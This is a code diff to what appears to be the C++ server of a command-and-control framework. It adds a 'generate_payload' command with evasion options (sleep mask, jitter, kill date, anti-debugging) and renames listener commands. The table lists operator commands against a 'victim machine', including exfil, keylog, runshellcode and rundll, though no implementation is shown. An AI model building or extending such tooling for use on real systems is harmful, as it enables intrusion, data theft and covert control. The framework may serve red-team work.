@@ -32,7 +32,8 @@ lurch::baphomet::init_commands() {
         commands.add_command("checkin", "Used by the agent to indicate it has connected.");
         commands.add_command("help", "display this help message and exit.");
         commands.add_command("getinfo", "retrieves basic info about the victim machine.");
-        commands.add_command("listeners", "displays existing listeners for this object.");
+        commands.add_command("listener", "displays a listener for this object if one exists.");
+        commands.add_command("stop_listener", "stops a listener for this object if one exists.");
 
         commands.add_command("cd", "changes the working directory")
             .arg<std::string>("--directory", "-d", true);
@@ -90,6 +91,16 @@ lurch::baphomet::init_commands() {
             .arg<std::string>("--address", "-a", true)
             .arg<int64_t>("--port", "-p", true);
 
+        commands.add_command("generate_payload", "generates a Baphomet payload in the specified format.")
+            .arg<std::string>("--format", "-f", true)
+            .arg<empty>("--use-listener", "-l", false)
+            .arg<std::string>("--user-agent", "-ua", false)
+            .arg<int64_t>("--sleeptime", "-s", false)
+            .arg<int64_t>("--jitter", "-j", false)
+            .arg<int64_t>("--killdate", "-kd", false)
+            .arg<empty>("--use-sleepmask", "-m", false)
+            .arg<empty>("--prevent-debugging", "-pd", false);
+
         commands.done();
 
         //
@@ -100,24 +111,26 @@ lurch::baphomet::init_commands() {
         {
             {"checkin",       &baphomet::checkin},
             {"start_listener",&baphomet::start_listener},
+            {"stop_listener", &baphomet::stop_listener},
             {"indicate_exit", &baphomet::indicate_exit},
-            {"cat",         &baphomet::cat},
-            {"cd",          &baphomet::cd},
-            {"mkdir",       &baphomet::mkdir},
-            {"rm",          &baphomet::rm},
-            {"cp",          &baphomet::cp},
-            {"ps",          &baphomet::ps},
-            {"cmd",         &baphomet::cmd},
-            {"exfil",       &baphomet::exfil},
-            {"keylog",       &baphomet::keylog},
-            {"runbof",      &baphomet::runbof},
-            {"runexe",      &baphomet::runexe},
-            {"rundll",      &baphomet::rundll},
-            {"runshellcode", &baphomet::runshellcode},
+            {"generate_payload", &baphomet::generate_payload},
+            {"cat",           &baphomet::cat},
+            {"cd",            &baphomet::cd},
+            {"mkdir",         &baphomet::mkdir},
+            {"rm",            &baphomet::rm},
+            {"cp",            &baphomet::cp},
+            {"ps",            &baphomet::ps},
+            {"cmd",           &baphomet::cmd},
+            {"exfil",         &baphomet::exfil},
+            {"keylog",        &baphomet::keylog},
+            {"runbof",        &baphomet::runbof},
+            {"runexe",        &baphomet::runexe},
+            {"rundll",        &baphomet::rundll},
+            {"runshellcode",  &baphomet::runshellcode},
             {"complete_task", &baphomet::complete_task},
             {"get_task",      &baphomet::get_task},
             {"tasks",       [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_tasks(); }},
-            {"listeners",   [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_listeners(); }},
+            {"listener",    [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_listeners(); }},
             {"staged",      [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_staged_files(); }},
             {"clear_tasks", [](baphomet*  ptr, reciever_context& ctx) { return ptr->clear_tasks(); }},
             {"help",        [&](baphomet* ptr, reciever_context& ctx) { return baphomet::commands.help(); }}
